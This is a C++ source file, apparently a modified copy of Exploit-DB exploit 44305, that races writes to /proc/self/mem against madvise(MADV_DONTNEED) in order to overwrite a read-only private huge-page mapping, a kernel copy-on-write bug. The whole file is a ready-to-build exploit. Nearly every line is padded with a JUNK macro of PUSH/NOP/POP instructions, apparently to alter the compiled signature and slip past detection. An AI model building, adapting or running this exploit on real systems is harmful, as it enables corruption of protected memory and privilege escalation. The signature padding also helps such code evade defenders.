// https://www.exploit-db.com/exploits/44305

// build : g++ exploit_44305_meta.cpp -o exploit_44305_meta -fpermissive -lpthread

#include <unistd.h>
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sched.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>

#define TRIES_PER_PAGE (20000000)
#define PAGE_SIZE (0x1000)
#define MEMESET_VAL (0x41)
#define MAP_SIZE (0x200000)
#define STRING "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define OFFSIZE ((sizeof(STRING)-1)/sizeof(char))

#define JUNK __asm__ __volatile__ ("PUSH %rax; NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP; POP %rax");

struct args{
  int fd;
  void *p;
  int stop;
  off_t off;
  char *chp;
};

void *write_thread(struct args *arg) {JUNK;
  for (int i = 0; i < TRIES_PER_PAGE && !arg->stop; i++) {
    lseek(arg->fd, (off_t)(arg->chp + arg->off*OFFSIZE), SEEK_SET);
    write(arg->fd, STRING, sizeof(STRING));JUNK;
    lseek(arg->fd, (off_t)(arg->chp + arg->off*OFFSIZE), SEEK_SET);
  }
  return NULL;JUNK;
}

void *wait_for_success(struct args *arg) {
  while(*(arg->chp+arg->off*OFFSIZE) != 'A') {
    int i = madvise(arg->p, MAP_SIZE, MADV_DONTNEED);JUNK;
    sched_yield();
  }
  arg->stop = 1;JUNK;
  return NULL;
}

int main(void) {
  struct args arg;JUNK;

  arg.off = 0;
  JUNK;
  arg.p =  mmap((void*)0x40000000, MAP_SIZE, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  JUNK;
  if(arg.p == MAP_FAILED)
    perror("[!] mmap()");
  arg.chp = arg.p;JUNK;
  printf("mmap address is %p\n", arg.p);JUNK;
  madvise(arg.p, MAP_SIZE, MADV_HUGEPAGE);JUNK;
JUNK;
  arg.fd = open("/proc/self/mem", O_RDWR);
  if (arg.fd < 0) {
    perror("[!] open()");JUNK;
    return 1;
  }JUNK;
  
  
  while(arg.off < PAGE_SIZE/sizeof(STRING)) {JUNK;
    arg.stop = 0;
    pthread_t thread0, thread1;JUNK;
    int ret = pthread_create(&thread0, NULL, (void *)wait_for_success, &arg);JUNK;
    ret |= pthread_create(&thread1, NULL, (void *)write_thread, &arg);JUNK;
    JUNK;
    if (ret) {JUNK;
      perror("[!] pthread_create()");
      return 1;
    }JUNK;
    JUNK;
    pthread_join(thread0, NULL);
    pthread_join(thread1, NULL); JUNK;
   
    printf("[*] Done 0x%x String\n", arg.off);
    arg.off++;JUNK;
  }
  printf("[*] Overwrite a page\n");JUNK;
  printf("%s\n", arg.p);JUNK;JUNK;
  return 0;
}